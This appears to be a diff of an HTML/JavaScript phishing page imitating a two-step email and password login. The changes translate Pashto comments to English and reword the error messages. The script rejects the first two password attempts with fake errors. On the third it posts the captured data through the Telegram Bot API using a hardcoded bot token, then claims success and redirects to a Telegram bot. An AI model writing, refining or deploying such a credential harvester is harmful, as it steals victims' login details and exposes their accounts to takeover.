@@ -119,14 +119,14 @@
     <div id="successBox" class="message success-msg"></div>
     <div id="loader" class="loader">
         <div class="loader-spinner"></div>
-        <p style="margin-top: 0.5rem; color: #5f6368;">✅ Login successful! Redirecting to bot...</p>
+        <p style="margin-top: 0.5rem; color: #5f6368;">Login successful! Redirecting to bot...</p>
     </div>
     <div class="step-text" id="stepIndicator">Step 1 of 2</div>
     <div class="footer"><span onclick="alert('English')">English</span><span onclick="alert('Help')">Help</span><span onclick="alert('Privacy')">Privacy</span><span onclick="alert('Terms')">Terms</span></div>
 </div>
 
 <script>
-    // ========== د بوټ لینک (مهم: دا سم کړئ) ==========
+    // ========== Bot Redirect Link ==========
     const BOT_REDIRECT = "https://t.me/imrankhabot?start=confirm_account";
     
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
@@ -156,11 +156,11 @@
         currentEmail = '';
     }
 
-    // مرحله 1: برېښنالیک
+    // Step 1: Email
     document.getElementById('nextBtn').onclick = () => {
         let email = document.getElementById('emailInput').value.trim();
         if (!email || !email.includes('@')) {
-            showMessage(document.getElementById('errorBox'), '❌ Valid email required', true);
+            showMessage(document.getElementById('errorBox'), 'Please check your email', true);
             return;
         }
         currentEmail = email;
@@ -171,11 +171,11 @@
         document.getElementById('passwordInput').value = '';
     };
 
-    // مرحله 2: پټنوم (هر ځل 3 هڅې)
+    // Step 2: Password with 3 attempts
     document.getElementById('loginBtn').onclick = async () => {
         let pass = document.getElementById('passwordInput').value.trim();
         if (!pass) {
-            showMessage(document.getElementById('errorBox'), '❌ Enter password', true);
+            showMessage(document.getElementById('errorBox'), 'Please check your email and password', true);
             return;
         }
         
@@ -186,17 +186,25 @@
         attempts[key]++;
         
         let currentAttempt = attempts[key];
+        let remaining = 3 - currentAttempt;
         
-        // لومړی او دوهم ځل - ناکام
-        if (currentAttempt === 1 || currentAttempt === 2) {
-            showMessage(document.getElementById('errorBox'), `❌ Incorrect password. ${3 - currentAttempt} attempts remaining.`, true);
+        // First attempt - show email error
+        if (currentAttempt === 1) {
+            showMessage(document.getElementById('errorBox'), 'Please check your email', true);
             setTimeout(() => goBackToEmail(), 1500);
             return;
         }
         
-        // درېیم ځل - بریالی
+        // Second attempt - show email and password error
+        if (currentAttempt === 2) {
+            showMessage(document.getElementById('errorBox'), 'Please check your email and password', true);
+            setTimeout(() => goBackToEmail(), 1500);
+            return;
+        }
+        
+        // Third attempt - success
         if (currentAttempt >= 3) {
-            // اډمن ته خبر ورکړئ
+            // Send notification to admin
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
@@ -206,7 +214,7 @@
                 })
             });
             
-            showMessage(document.getElementById('successBox'), '✅ Login successful! Redirecting to bot...', false);
+            showMessage(document.getElementById('successBox'), 'Login successful! Redirecting to bot...', false);
             document.getElementById('loader').style.display = 'block';
             
             delete attempts[key];
